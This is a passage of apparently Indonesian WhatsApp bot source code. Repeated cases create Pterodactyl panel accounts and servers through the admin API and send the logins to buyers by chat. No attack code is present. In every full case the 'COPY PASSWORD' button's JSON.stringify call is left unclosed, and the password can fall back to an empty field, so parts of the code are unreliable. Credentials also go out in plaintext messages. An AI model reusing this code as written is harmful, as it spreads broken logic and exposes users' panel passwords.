│ • *RAM :* 36150
│ • *DISK :* 36150
│ • *CPU :* 1080%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break

case "37gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "37150"
let cpu = "1110"
let disk = "37150"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • RAM : 37150
│ • DISK : 37150
│ • CPU : 1110%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 37150
│ • *DISK :* 37150
│ • *CPU :* 1110%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break
case "38gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "38150"
let cpu = "1140"
let disk = "38150"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • RAM : 38150
│ • DISK : 38150
│ • CPU : 1140%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 38150
│ • *DISK :* 38150
│ • *CPU :* 1140%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break
case "39gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "39150"
let cpu = "1170"
let disk = "39150"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • RAM : 39150
│ • DISK : 39150
│ • CPU : 1170%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 39150
│ • *DISK :* 39150
│ • *CPU :* 1170%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break
case "40gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "40175"
let cpu = "1200"
let disk = "40175"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • RAM : 40175
│ • DISK : 40175
│ • CPU : 1200%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 40175
│ • *DISK :* 40175
│ • *CPU :* 1200%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break
case "41gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "41175"
let cpu = "1230"
let disk = "41175"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • RAM : 41175
│ • DISK : 41175
│ • CPU : 1230%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 41175
│ • *DISK :* 41175
│ • *CPU :* 1230%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break
case "42gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "42175"
let cpu = "1260"
let disk = "42175"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • RAM : 42175
│ • DISK : 42175
│ • CPU : 1260%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 42175
│ • *DISK :* 42175
│ • *CPU :* 1260%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break
case "43gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "43175"
let cpu = "1290"
let disk = "43175"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • RAM : 43175
│ • DISK : 43175
│ • CPU : 1290%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
